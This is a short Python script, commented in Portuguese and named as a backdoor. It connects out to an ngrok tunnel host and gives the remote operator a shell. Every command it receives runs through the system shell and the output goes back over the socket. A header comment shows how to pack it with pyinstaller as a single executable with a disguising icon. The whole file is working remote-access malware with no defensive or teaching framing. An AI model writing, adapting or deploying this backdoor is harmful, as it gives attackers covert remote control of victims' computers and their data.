#!/usr/bin/python3
# pyinstaller -F bkd.py --icon=some-icon.ico

import os
import socket
import subprocess

# variaveis de conexão reversa
ip = "8.tcp.ngrok.io"
port = 17534

# iniciando conexao
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(str.encode("[*] Conexao Estabelecida!\n"))


# loop de comandos
while 1:
    try:
        s.send(str.encode("shell> "))
        cmd = s.recv(1024).decode("utf-8")
        cmd = cmd.strip('\n')
        if cmd == "sair": 
            break
        if cmd[:2] == "cd":
            os.chdir(cmd[3:])
        if len(cmd) > 0:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            valor_saida = proc.stdout.read() + proc.stderr.read()
            try:
                saida_str = str(valor_saida, "utf-8")
                s.send(str.encode("\n" + saida_str))
            except Exception:
                saida_str = str(valor_saida, "latin_1")
                s.send(str.encode("\n" + saida_str))
    except Exception as e:
        continue
    
s.close()
exit()
